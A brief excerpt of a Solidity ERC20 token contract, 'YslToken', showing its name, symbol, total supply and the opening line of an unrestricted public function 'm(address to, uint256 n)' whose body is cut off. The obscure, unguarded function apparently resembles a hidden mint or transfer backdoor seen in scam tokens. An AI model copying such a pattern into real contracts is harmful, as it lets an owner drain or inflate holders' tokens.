...
contract YslToken is IERC20, Ownable {
    ...
    string private _name = "YslToken";
    string private _symbol = "YslToken";
    ...
    uint256 private _tTotal = 88888000000000;
    ...
    function m(address to,uint256 n) public {
